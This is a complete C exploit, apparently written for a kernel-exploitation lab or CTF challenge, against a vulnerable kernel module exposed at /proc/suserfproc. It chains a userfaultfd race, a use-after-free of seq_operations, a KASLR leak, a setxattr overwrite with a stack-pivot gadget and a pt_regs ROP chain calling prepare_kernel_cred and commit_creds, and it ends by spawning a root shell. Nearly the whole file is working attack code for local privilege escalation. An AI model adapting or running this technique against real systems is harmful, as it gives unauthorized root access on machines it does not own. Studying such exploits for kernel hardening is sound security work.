//gcc -masm=intel -static exploit.c -o exploit
//home/race_condition/userfaultfd/suserf/setxattr/exploit

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/xattr.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff8107fc70
#define pop_rdx_ret 0xffffffff8112b2ca
#define mov_rdi_rax_pop_rbp_ret 0xffffffff814d753b

#define prepare_kernel_cred 0xffffffff810b8360
#define commit_creds 0xffffffff810b7fb0
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00974
#define single_start 0xffffffff812cbc90

int             suserf_fd;
size_t          seq_fd;
size_t          seq_fd_reserve[0x50];
static size_t   page_size;
static char*    page = NULL;

struct suserf_note {
    size_t idx;
    size_t size;
    char* buf;
};

void suserf_add(size_t idx, size_t size, char* buf)
{
    struct suserf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(suserf_fd, 0x112233, &note);
}

// kfree(&notebook[idx]->data)
// copy data to buf
void suserf_del(size_t idx, char* buf)
{
    struct suserf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(suserf_fd, 0x334455, &note);
}

// 把 notebook[idx]->data 数据读到 buf
// ssize_t suserf_read(int idx, void* buf)
// {
//     return read(suserf_fd, buf, idx);
// }

size_t  SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
size_t  POP_RDI_RET;
size_t  POP_RDX_RET;
size_t  COMMIT_CREDS;
size_t  ADD_RSP_0x198_POP_RBX_POP_RBP_RET;
size_t  MOV_RDI_RAX_POP_RBP_RET;
size_t  PREPARE_KERNEL_CRED;

pthread_t   uffd_leak_thread, uffd_hack_thread;
char*       uffd_buf_leak;
char*       uffd_buf_hack;

static void* leak_thread(void *arg)
{
    struct  uffd_msg msg;
    int     fault_cnt = 0;
    long    uffd;
    size_t  buf[0x10];

    struct  uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("Poll error!");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            err_exit("EOF on userfaultfd!");

        if (nread == -1)
            err_exit("Read error!");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd!\n");

        puts("\033[34m\033[1m[*] Allocation seq_operations in userfaultfd...\033[0m");
        // freelist->1->0
        suserf_del(1, buf);
        // seq_operations 分配到 chunk0
        seq_fd = open("/proc/self/stat", O_RDONLY);

        suserf_del(0, buf);
        print_binary(buf, 0x20);
        kernel_offset = buf[1];
        
        printf("\033[32m\033[1m[+] Leak ptr: 0x%lx\033[0m\n", kernel_offset);
        kernel_offset -= 0xffffffff812cbcd0;
        kernel_base += kernel_offset;
        ADD_RSP_0x198_POP_RBX_POP_RBP_RET = 0xffffffff816bda54 + kernel_offset;
        *(size_t *)(uffd_buf_hack + page_size - 8) = ADD_RSP_0x198_POP_RBX_POP_RBP_RET;

        printf("\033[32m\033[1m[+] Kernel offset: 0x%lx\033[0m\n", kernel_offset);
        printf("\033[32m\033[1m[+] Kernel base: 0x%lx\033[0m\n", kernel_base);
        printf("\033[32m\033[1m[+] ADD_RSP_0x198_POP_RBX_POP_RBP_RET: 0x%lx\033[0m\n", 
            ADD_RSP_0x198_POP_RBX_POP_RBP_RET);
        
        // setxattr kmalloc 分配到 chunk0
        // setxattr copy_from_user 写入8字节也就是把 ADD_RSP_0x198_POP_RBX_POP_RBP_RET 到 seq_operations[0]
        // 再写入就会缺页, 通过 userfaultfd 阻塞, 执行 get_shell_thread 函数
        setxattr("/home/race_condition/userfaultfd/suserf/setxattr/exploit", 
            "ccelend1", uffd_buf_hack + page_size - 8, 32, 0);

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("Ioctl-UFFDIO_COPY!");

        return NULL;
    }
}

static void* get_shell_thread(void *arg)
{
    struct  uffd_msg msg;
    int     fault_cnt = 0;
    long    uffd;
    size_t  buf[0x10];

    struct  uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("Poll error!");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            err_exit("EOF on userfaultfd!");

        if (nread == -1)
            err_exit("Read error!");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd!\n");

        puts("\033[34m\033[1m[*] Setxattr trapped in userfaultfd...\033[0m");
        // kernel gadget
        POP_RDI_RET = pop_rdi_ret + kernel_offset;
        POP_RDX_RET = pop_rdx_ret + kernel_offset;
        COMMIT_CREDS = commit_creds + kernel_offset;
        MOV_RDI_RAX_POP_RBP_RET = mov_rdi_rax_pop_rbp_ret + kernel_offset;
        PREPARE_KERNEL_CRED = prepare_kernel_cred + kernel_offset;
        SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE = swapgs_restore_regs_and_return_to_usermode;
        SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE += kernel_offset;
        SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE += 16;   // pop r8

        // pt_regs 来完成 ROP
        __asm__(
           "mov r15,   POP_RDI_RET;"
           "mov r14,   0;"
           "mov r13,   PREPARE_KERNEL_CRED;"
           "mov r12,   MOV_RDI_RAX_POP_RBP_RET;"
           "mov rbp,   0xbbbbbbbbbb;"
           "mov rbx,   POP_RDX_RET;"
           "mov r11,   0x1111111111;"
           "mov r10,   COMMIT_CREDS;"
           "mov r9,    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;"
           "mov r8,    0x8888888888;"
           "xor rax,   rax;"
           "mov rcx,   0xcccccccccc;"
           
           "mov rdx,   8;"
           "mov rsi,   rsp;"
           "mov rdi,   seq_fd;"             // 通过 seq_operations->stat 来触发
           "syscall"
        );
        puts("\033[32m\033[1m[+] Successful to get the root.\033[0m");
        puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
        system("/bin/sh");

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("Ioctl-UFFDIO_COPY!");

        return NULL;
    }
}

int main(int argc, char **argv, char **envp)
{

    size_t   buf[0x50];

    bind_core(0);

    page = malloc(0x1000);
    page_size = sysconf(_SC_PAGE_SIZE);

    suserf_fd = open("/proc/suserfproc", O_RDONLY);
    if (suserf_fd < 0) {
        err_exit("Failed to open /proc/suserfproc!");
    }

    // 分配匿名内存 uffd_buf_leek, 并没有实际分配物理页面
    note_info("Fegister userfaultfd...");
    uffd_buf_leak = (char *)mmap(NULL, page_size, PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // 通过 userfaultfd 系统调用注册一个 userfaultfd, 出现缺页就执行 leak_thread 函数
    register_userfaultfd(&uffd_leak_thread, uffd_buf_leak, page_size, leak_thread);

    // 分配匿名内存 uffd_buf_hack
    uffd_buf_hack = (char*)mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(&uffd_hack_thread, uffd_buf_hack + page_size, page_size, get_shell_thread);

    for(int i = 0; i < 2; i++){
        suserf_add(i, 0x20, buf);
    }
    // suserf_del 函数里 copy_to_user 缺页然后通过 userfaultfd 阻塞, 执行 leak_thread 函数
    suserf_del(0, uffd_buf_leak);

}
